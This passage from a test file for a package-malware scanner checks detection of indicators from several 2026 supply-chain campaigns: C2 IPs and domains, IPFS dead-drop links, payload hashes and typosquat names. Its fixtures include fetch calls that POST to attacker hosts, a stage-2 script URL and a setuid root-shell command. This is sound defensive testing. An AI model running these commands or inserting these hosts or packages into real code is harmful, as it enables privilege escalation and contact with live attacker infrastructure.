      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // ChocoPoC RAT / fake PoC exploit repos (The Hacker News, July 2, 2026)
  // =================================================================

  describe("ChocoPoC Fake PoC Repos (July 2026)", () => {
    it("should match the malicious ChocoPoC PyPI package names against the typosquat patterns", () => {
      for (const name of ["frint", "skytext", "slogsec", "logcrypt.cryptography"]) {
        const matches = PYPI_TYPOSQUAT_PATTERNS.some((pattern) =>
          new RegExp(pattern).test(name),
        );
        expect(matches).toBe(true);
      }
    });

    it("should detect the 91.132.163.78 upload-server C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "config.js"),
        'const upload = "91.132.163.78";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // PolinRider DPRK supply-chain campaign (Socket / THN, July 6, 2026)
  // =================================================================

  describe("PolinRider DPRK Supply Chain (July 2026)", () => {
    it("should flag the compromised Xpos587 GitHub account reference", async () => {
      fs.writeFileSync(
        path.join(tempDir, "deps.go"),
        'package main\nimport _ "github.com/Xpos587/git2md"'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  //  Fake Paysafe / Skrill / Neteller payment SDKs (Socket, July 8, 2026)
  // =================================================================

  describe("Fake Payment SDK Typosquat (July 2026)", () => {
    const NPM_NAMES = [
      "paysafe-checkout", "paysafe-vault", "paysafe-js", "paysafe-api",
      "paysafe-node", "paysafe-cards", "paysafe-fraud", "paysafe-kyc",
      "paysafe-payments", "skrill", "skrill-sdk", "skrill-payments", "neteller",
    ];
    const PYPI_NAMES = ["paysafe-kyc", "paysafe-payments", "paysafe-sdk", "paysafe-api"];

    it("matches every fake npm SDK name against the malicious-name patterns", () => {
      for (const name of NPM_NAMES) {
        const hit = MALICIOUS_PACKAGE_PATTERNS.some((p) => new RegExp(p).test(name));
        expect(hit, name).toBe(true);
      }
    });

    it("matches every fake PyPI SDK name, incl. the underscore form", () => {
      for (const name of [...PYPI_NAMES, "paysafe_kyc", "paysafe_sdk"]) {
        const hit = PYPI_TYPOSQUAT_PATTERNS.some((p) => new RegExp(p).test(name));
        expect(hit, name).toBe(true);
      }
    });

    it("does NOT match legitimate neighbouring names (anchored, no FP)", () => {
      const legit = ["paysafe-sdk-wrapper", "my-skrill", "neteller-utils", "paysafe", "skrillex"];
      for (const name of legit) {
        const npmHit = MALICIOUS_PACKAGE_PATTERNS.some((p) => new RegExp(p).test(name));
        const pyHit = PYPI_TYPOSQUAT_PATTERNS.some((p) => new RegExp(p).test(name));
        expect(npmHit || pyHit, name).toBe(false);
      }
    });

    it("flags a directory scan whose package.json depends on a fake SDK", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({ name: "app", version: "1.0.0", dependencies: { "skrill-sdk": "1.0.2" } }),
      );
      const report = await scan({ target: tempDir, format: "text" });
      const dep = report.findings.find((f) => f.rule === "MALICIOUS_DEPENDENCY");
      expect(dep).toBeDefined();
      expect(dep?.match).toBe("skrill-sdk");
    });

    it("does NOT flag a legitimate dependency (dir-scan FP guard)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({ name: "app", version: "1.0.0", dependencies: { "left-pad": "1.3.0", "paysafe-sdk-wrapper": "2.0.0" } }),
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.some((f) => f.rule === "MALICIOUS_DEPENDENCY")).toBe(false);
    });

    it("flags the ngrok C2 tunnel in package code", async () => {
      fs.writeFileSync(
        path.join(tempDir, "index.js"),
        'fetch("https://caliber-spinner-finishing.ngrok-free.dev", { method: "POST" });',
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.some((f) => f.rule === "IOC_KNOWN_C2_DOMAIN")).toBe(true);
    });

    it("the install guard blocks a fake SDK before npm runs", async () => {
      const { analyzeInstallCommand } = await import("../install-guard.js");
      expect(analyzeInstallCommand("npm", ["install", "skrill-sdk"]).blocked).toBe(true);
      expect(analyzeInstallCommand("npm", ["install", "paysafe-vault@1.0.3"]).blocked).toBe(true);
    });
  });

  // =================================================================
  // Injective Labs SDK npm compromise (July 8, 2026)
  // =================================================================

  describe("Injective SDK npm compromise (July 2026)", () => {
    it("flags @injectivelabs/sdk-ts@1.20.21 as a known-bad version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "@injectivelabs/sdk-ts": "1.20.21" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("flags a transitively-pinned dependent (@injectivelabs/wallet-core@1.20.21)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "@injectivelabs/wallet-core": "1.20.21" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("does NOT flag the clean @injectivelabs/sdk-ts@1.20.23", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "@injectivelabs/sdk-ts": "1.20.23" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.findings.some((f) => f.rule === "IOC_KNOWN_BAD_VERSION")
      ).toBe(false);
    });

    it("detects the fake-telemetry exfil domain in package code", async () => {
      fs.writeFileSync(
        path.join(tempDir, "telemetry.js"),
        'fetch("https://testnet.archival.chain.grpc-web.injective.network", { method: "POST", body });'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("detects the sdk-ts infostealer file hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hash.txt.js"),
        'const h = "103c4e6181151c1bcfedc41506cd1815458c38375d08a8fcd9981dbe0b965ce0";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // AsyncAPI npm supply-chain compromise (July 14, 2026)
  // =================================================================

  describe("AsyncAPI npm compromise (July 2026)", () => {
    it("flags @asyncapi/generator@3.3.1 as a known-bad version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "@asyncapi/generator": "3.3.1" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("flags the pre-release @asyncapi/specs@6.11.2-alpha.1", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "@asyncapi/specs": "6.11.2-alpha.1" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("does NOT flag a clean @asyncapi/generator version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "@asyncapi/generator": "3.3.0" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.findings.some((f) => f.rule === "IOC_KNOWN_BAD_VERSION")
      ).toBe(false);
    });

    it("detects the IPFS second-stage dead-drop CID in package code", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'const url = "https://ipfs.io/ipfs/QmQobZSp1wRPrpSEQ56qnyq7ecZh5Bg5k1fnjt4SUwwHb9";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_DEAD_DROP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("detects the second IPFS payload CID serving the specs branch", async () => {
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'const cfg = "https://ipfs.io/ipfs/Qmet4fhsAaWMBUxNDfREHwgiyDeSWy4YSYs9wiKUW5jGyf";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_DEAD_DROP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("detects the botnet C2 IP address", async () => {
      fs.writeFileSync(
        path.join(tempDir, "beacon.js"),
        'const c2 = "http://85.137.53.71:8080/cmd";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("detects a malicious tarball hash in a vendored-artifact manifest", async () => {
      fs.writeFileSync(
        path.join(tempDir, "vendor-manifest.json"),
        JSON.stringify({
          artifact: "asyncapi-generator.tgz",
          sha256:
            "bfaeb987faa6de2b5a5eb63b1233d055215b09b0349a9394f2175fd7cdf385e4",
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("does NOT flag a clean file with no campaign indicators", async () => {
      fs.writeFileSync(
        path.join(tempDir, "clean.js"),
        'const gateway = "https://ipfs.io/ipfs/";\nconst host = "85.137.53.70";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.findings.some(
          (f) =>
            f.rule === "IOC_KNOWN_DEAD_DROP" ||
            f.rule === "IOC_KNOWN_C2_IP" ||
            f.rule === "IOC_KNOWN_MALWARE_HASH"
        )
      ).toBe(false);
    });
  });

  describe("PhantomSync npm crypto stealer (July 2026)", () => {
    it("flags base58-utils@1.0.0 as a known-bad version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({ name: "consumer", version: "1.0.0", dependencies: { "base58-utils": "1.0.0" } })
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_BAD_VERSION");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("does NOT flag base58-utils@1.0.2 (only 1.0.0/1.0.1/1.0.3 are malicious)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({ name: "consumer", version: "1.0.0", dependencies: { "base58-utils": "1.0.2" } })
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.some((f) => f.rule === "IOC_KNOWN_BAD_VERSION")).toBe(false);
    });

    it("detects a PhantomSync IPFS config-fallback CID in package code", async () => {
      fs.writeFileSync(
        path.join(tempDir, "sync.js"),
        'const cid = "Qmcqz3w8j4qFQXDAXAxnrdc2oSX3nzBT4NqtpTqL8mr1ga";'
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.some((f) => f.rule === "IOC_KNOWN_DEAD_DROP")).toBe(true);
    });
  });

  describe("Pepesoft NuGet surveillance (July 2026)", () => {
    it("detects a Pepesoft payload SHA-256 referenced in content", async () => {
      fs.writeFileSync(
        path.join(tempDir, "manifest.json"),
        JSON.stringify({ hash: "d5385526f2f3e52c7d96087611c6cd4e479bf61828400efdb3ca09406d981609" })
      );
      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "IOC_KNOWN_MALWARE_HASH");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("flags the Pepesoft Cloudflare-Worker C2 sub-host", async () => {
      fs.writeFileSync(
        path.join(tempDir, "cfg.js"),
        'fetch("https://calm-voice-9797.888c888x888.workers.dev/activate");'
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.some((f) => f.rule === "IOC_KNOWN_C2_DOMAIN")).toBe(true);
    });

    it("does NOT block the redacted-placeholder NuGet id (albion-x-x is not an installable id)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "packages.config"),
        '<packages><package id="albion-x-x" version="1.0.0" /></packages>'
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.some((f) => f.rule === "IOC_KNOWN_BAD_VERSION")).toBe(false);
    });

    it("does NOT flag the legitimate workers.dev / selcloud.ru apex (specific sub-host only)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "ok.js"),
        'fetch("https://my-app.workers.dev/x"); fetch("https://storage.selcloud.ru/y");'
      );
      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.some((f) => f.rule === "IOC_KNOWN_C2_DOMAIN")).toBe(false);
    });
  });

  // =================================================================
  // ViteVenom - malicious Vite npm packages (Checkmarx, July 2026)
  // =================================================================

  describe("ViteVenom Vite npm packages (July 2026)", () => {
    const NAMES = [
      "@uw010010/vite-tree",
      "@vite-tab/tab",
      "@vite-ln/build-ts",
      "@vite-mcp/vite-type",
      "@vite-pro/vite-ui",
      "@vitets/vite-ts",
      "@vite-ts/vite-ui",
    ];

    it("matches every ViteVenom package name against the malicious-name patterns", () => {
      for (const name of NAMES) {
        const hit = MALICIOUS_PACKAGE_PATTERNS.some((p) => new RegExp(p).test(name));
        expect(hit, name).toBe(true);
      }
    });

    it("does NOT match the legitimate @vitejs namespace it impersonates", () => {
      const legit = ["@vitejs/plugin-react", "@vitejs/plugin-vue", "vite", "vite-plugin-svgr"];
      for (const name of legit) {
        const hit = MALICIOUS_PACKAGE_PATTERNS.some((p) => new RegExp(p).test(name));
        expect(hit, name).toBe(false);
      }
    });

    it("flags a directory scan that depends on a ViteVenom package (any version)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "app",
          version: "1.0.0",
          dependencies: { "@vitets/vite-ts": "1.0.0" },
        })
      );
      const report = await scan({ target: tempDir, format: "text" });
      const dep = report.findings.find((f) => f.rule === "MALICIOUS_DEPENDENCY");
      expect(dep).toBeDefined();
      expect(dep?.match).toBe("@vitets/vite-ts");
      expect(dep?.severity).toBe("critical");
    });

    it("the install guard blocks a ViteVenom package before npm runs", async () => {
      const { analyzeInstallCommand } = await import("../install-guard.js");
      expect(analyzeInstallCommand("npm", ["install", "@uw010010/vite-tree"]).blocked).toBe(true);
      expect(analyzeInstallCommand("npm", ["install", "@vite-pro/vite-ui@2.3.4"]).blocked).toBe(true);
    });
  });

  // =================================================================
  // ChainVeil - predecessor wave of ViteVenom (Checkmarx Zero, June 2026)
  // =================================================================

  describe("ChainVeil npm typosquats (June 2026)", () => {
    const NAMES = [
      "tailwindcss-animatics",
      "tailwindcss-animates-kit",
      "tailwindcss-merge",
      "sass-formats",
      "sass-format",
      "clsx-tailwind",
      "typeorm-encrypt",
      "rate-limit-flexible",
      "rate-limits-flexible",
    ];

    it("matches every ChainVeil package name against the malicious-name patterns", () => {
      for (const name of NAMES) {
        const hit = MALICIOUS_PACKAGE_PATTERNS.some((p) => new RegExp(p).test(name));
        expect(hit, name).toBe(true);
      }
    });

    it("does NOT match the legitimate packages the campaign typosquats", () => {
      const legit = [
        "tailwind-merge",
        "tailwindcss",
        "tailwindcss-animate",
        "sass",
        "clsx",
        "typeorm",
        "rate-limiter-flexible",
      ];
      for (const name of legit) {
        const hit = MALICIOUS_PACKAGE_PATTERNS.some((p) => new RegExp(p).test(name));
        expect(hit, name).toBe(false);
      }
    });

    it("flags a directory scan that depends on a ChainVeil package (any version)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "app",
          version: "1.0.0",
          dependencies: { "tailwindcss-merge": "1.0.3" },
        })
      );
      const report = await scan({ target: tempDir, format: "text" });
      const dep = report.findings.find((f) => f.rule === "MALICIOUS_DEPENDENCY");
      expect(dep).toBeDefined();
      expect(dep?.match).toBe("tailwindcss-merge");
      expect(dep?.severity).toBe("critical");
    });

    it("does NOT flag a directory scan depending on the legitimate tailwind-merge", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "app",
          version: "1.0.0",
          dependencies: { "tailwind-merge": "2.5.4", "rate-limiter-flexible": "5.0.3" },
        })
      );
      const report = await scan({ target: tempDir, format: "text" });
      const dep = report.findings.find((f) => f.rule === "MALICIOUS_DEPENDENCY");
      expect(dep).toBeUndefined();
    });

    it("the install guard blocks a ChainVeil package before npm runs", async () => {
      const { analyzeInstallCommand } = await import("../install-guard.js");
      expect(analyzeInstallCommand("npm", ["install", "clsx-tailwind"]).blocked).toBe(true);
      expect(analyzeInstallCommand("npm", ["install", "rate-limits-flexible@1.0.1"]).blocked).toBe(true);
      expect(analyzeInstallCommand("npm", ["install", "rate-limiter-flexible"]).blocked).toBe(false);
    });
  });

  // =================================================================
  // NadMesh botnet - Go-based botnet hunting exposed AI services
  // (XLab via The Hacker News, July 2026)
  // =================================================================

  describe("NadMesh botnet (July 2026)", () => {
    it("should detect the cdnorigin.net C2 domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "agent.go"),
        'const c2 = "https://cdnorigin.net/nad"'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the 209.99.186.235 C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "host.go"),
        'const ip = "209.99.186.235"'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the NadMesh agent-sample SHA1 hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashes.js"),
        'const h = "31c69b3e12936abca770d430066f379ec1d997ec";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // SleeperGem - malicious RubyGems releases
  // (StepSecurity / Aikido via The Hacker News, July 2026)
  // =================================================================

  describe("SleeperGem RubyGems releases (July 2026)", () => {
    it("flags the impersonation gem in a Gemfile", async () => {
      fs.writeFileSync(
        path.join(tempDir, "Gemfile"),
        'source "https://rubygems.org"\ngem "git_credential_manager", "2.8.1"\n'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "RUBY_MALICIOUS_GEM");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
      expect(finding?.description).toContain("SleeperGem");
    });

    it("flags the hijacked sleeper releases in a Gemfile.lock", async () => {
      fs.writeFileSync(
        path.join(tempDir, "Gemfile.lock"),
        [
          "GEM",
          "  remote: https://rubygems.org/",
          "  specs:",
          "    Dendreo (1.1.4)",
          "    fastlane-plugin-run_tests_firebase_testlab (0.3.2)",
          "",
        ].join("\n")
      );

      const report = await scan({ target: tempDir, format: "text" });
      const gems = report.findings.filter((f) => f.rule === "RUBY_MALICIOUS_GEM");
      expect(gems).toHaveLength(2);
      expect(gems.every((f) => f.severity === "critical")).toBe(true);
    });

    it("does NOT flag clean versions of the two hijacked real gems", async () => {
      fs.writeFileSync(
        path.join(tempDir, "Gemfile.lock"),
        [
          "GEM",
          "  remote: https://rubygems.org/",
          "  specs:",
          "    Dendreo (1.2.0)",
          "    fastlane-plugin-run_tests_firebase_testlab (0.4.0)",
          "",
        ].join("\n")
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(report.findings.filter((f) => f.rule === "RUBY_MALICIOUS_GEM")).toHaveLength(0);
    });

    it("should detect the git.disroot.org/git-ecosystem payload host", async () => {
      // .rb is not in SCANNABLE_EXTENSIONS; use .js to exercise the signature
      fs.writeFileSync(
        path.join(tempDir, "loader.js"),
        'const STAGE2 = "https://git.disroot.org/git-ecosystem/gcm/raw/branch/main/deploy.sh";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "SLEEPERGEM_PAYLOAD_HOST"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the setuid root shell path", async () => {
      fs.writeFileSync(
        path.join(tempDir, "deploy.sh"),
        'cp /bin/sh /usr/local/sbin/ping6 && chmod u+s /usr/local/sbin/ping6\n'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "SLEEPERGEM_SETUID_SHELL"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("high");
    });
  });

  // =================================================================
  // jscrambler npm supply-chain compromise
  // (Socket / The Hacker News / OX / StepSecurity, July 11, 2026)
  // =================================================================

  describe("jscrambler npm compromise (July 2026)", () => {
    it("should flag jscrambler@8.14.0 (preinstall-hook wave) as a known-bad version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { jscrambler: "8.14.0" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should flag jscrambler@8.20.0 (dist-dropper wave) as a known-bad version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { jscrambler: "8.20.0" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should flag the grunt-jscrambler companion plugin known-bad version", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          devDependencies: { "grunt-jscrambler": "8.5.2" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_BAD_VERSION"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should NOT flag the last clean jscrambler release (8.13.0)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { jscrambler: "8.13.0" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      expect(
        report.findings.filter((f) => f.rule === "IOC_KNOWN_BAD_VERSION")
      ).toHaveLength(0);
    });

    it("should detect a jscrambler infostealer payload hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashes.js"),
        'const h = "a742de963f14a92d24ebcbc7b44ac867e23a20d31d1b0094a13a4f83287f4e60";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the malicious jscrambler@8.20.0 manifest hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "manifest-hash.js"),
        'const h = "bba32ddeab075a5e5015eec50f5d2af364c95b848732c714aea6b6baf78f49f0";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // cPanel/WHM GitHub Actions abuse campaign (Socket, July 23, 2026)
  // =================================================================

  describe("cPanel/WHM GitHub Actions abuse (July 2026)", () => {
    it("should detect the 43.228.157.68 C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "workflow-payload.js"),
        'const dl = "http://43.228.157.68:80/api/dl/amd64";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the dnshook.site DNS-callback subdomain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "beacon.js"),
        'const cb = "f5b0b742-240a-4811-8a5b-b0ba6060685d.dnshook.site";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the Linux exploit payload hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashes.js"),
        'const h = "22f721fd3a81d2e27cbf90a122bb977f630c50b79daa98350f0e57b04dfa81f1";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // Apex macOS infostealer npm packages
  // (safedep / The Hacker News, July 22, 2026)
  // =================================================================

  describe("Apex macOS infostealer npm packages (July 2026)", () => {
    it("should match both apex package names against the malicious-name patterns", () => {
      for (const name of ["@apexfdn/apex", "@copilot-mcp/apex"]) {
        const matches = MALICIOUS_PACKAGE_PATTERNS.some((pattern) =>
          new RegExp(pattern).test(name),
        );
        expect(matches).toBe(true);
      }
    });

    it("should flag @copilot-mcp/apex listed in a package.json (any version)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "consumer",
          version: "1.0.0",
          dependencies: { "@copilot-mcp/apex": "1.0.7" },
        })
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "MALICIOUS_DEPENDENCY"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  });

  // =================================================================
  // FakeAgent campaign / SectopRAT via fake Claude Desktop app
  // (Huntress / BleepingComputer / Help Net Security, July 21-22, 2026)
  // =================================================================

  describe("FakeAgent SectopRAT fake Claude Desktop (July 2026)", () => {
    it("should detect an attacker-registered redirect domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "redirect.js"),
        'const next = "https://downloading-api.it.com/html/claude/win";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect the trojanized ClaudeDesktop.exe payload hash", async () => {
      fs.writeFileSync(
        path.join(tempDir, "hashes.js"),
        'const h = "1cd58cfba596da296ab1878d74023e00c399345a1b6c2a0e5446c53563f4e3bb";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_MALWARE_HASH"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should detect a SectopRAT C2 IP", async () => {
      fs.writeFileSync(
        path.join(tempDir, "c2.js"),
        'const c2 = "107.189.24.67";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_IP"
      );
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });

    it("should NOT flag the legitimate claude.ai domain", async () => {
      fs.writeFileSync(
        path.join(tempDir, "legit.js"),
        'const url = "https://claude.ai/download";'
      );

      const report = await scan({ target: tempDir, format: "text" });
      const finding = report.findings.find(
        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
      );
      expect(finding).toBeUndefined();
    });
  });

  // =================================================================
  // NeoShadow - npm typosquats with MSBuild execution and an Ethereum
  // contract as the C2 resolver (Aikido, January 2026; packages
  // corroborated by o3.security MAL-2026-334)
  // =================================================================

  describe("NeoShadow npm typosquats (January 2026)", () => {
    const NAMES = ["viem-js", "cyrpto", "tailwin", "supabase-js"];

    it("matches every NeoShadow package name against the malicious-name patterns", () => {
      for (const name of NAMES) {
        const hit = MALICIOUS_PACKAGE_PATTERNS.some((p) => new RegExp(p).test(name));
        expect(hit, name).toBe(true);
      }
    });

    it("does NOT match the legitimate packages the campaign typosquats", () => {
      // Unscoped names only: the scoped catch-all pattern deliberately matches any
      // non-allowlisted "@scope/name", so the real @supabase/supabase-js cannot be
      // asserted here. What matters is that the unscoped squat is distinct from it.
      const legit = ["viem", "tailwindcss", "tailwind-merge", "supabase"];
      for (const name of legit) {
        const hit = MALICIOUS_PACKAGE_PATTERNS.some((p) => new RegExp(p).test(name));
        expect(hit, name).toBe(false);
      }
    });

    it("flags a directory scan that depends on a NeoShadow package (any version)", async () => {
      fs.writeFileSync(
        path.join(tempDir, "package.json"),
        JSON.stringify({
          name: "app",
          version: "1.0.0",
          dependencies: { "viem-js": "1.0.4" },
        })
      );
